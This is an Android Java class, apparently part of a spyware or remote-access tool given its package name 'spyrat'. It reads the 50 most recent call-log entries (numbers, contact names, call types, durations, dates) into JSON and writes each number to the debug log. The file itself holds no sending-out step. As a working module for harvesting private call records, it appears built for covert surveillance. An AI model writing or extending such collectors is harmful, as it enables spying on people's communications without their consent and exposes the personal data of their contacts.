package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Date;

public class RealCallLogCollector {
    private static final String TAG = "RealCallLogCollector";
    private Context context;
    
    public RealCallLogCollector(Context context) {
        this.context = context;
    }
    
    public JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📞 Collecting real call logs...");
            
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
            };
            
            cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    
                    JSONObject call = new JSONObject();
                    call.put("number", number != null ? number : "Unknown");
                    call.put("name", name != null ? name : "Unknown");
                    call.put("type", getCallType(type));
                    call.put("duration", duration);
                    call.put("timestamp", date);
                    call.put("readable_date", new Date(date).toString());
                    call.put("duration_minutes", String.format("%d:%02d", duration / 60, duration % 60));
                    
                    callLogs.put(call);
                    Log.d(TAG, "📞 Call: " + number + " - " + getCallType(type) + " - " + duration + "s");
                    
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + callLogs.length() + " real call logs");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return callLogs;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
            case CallLog.Calls.MISSED_TYPE: return "missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "blocked";
            default: return "unknown";
        }
    }
}
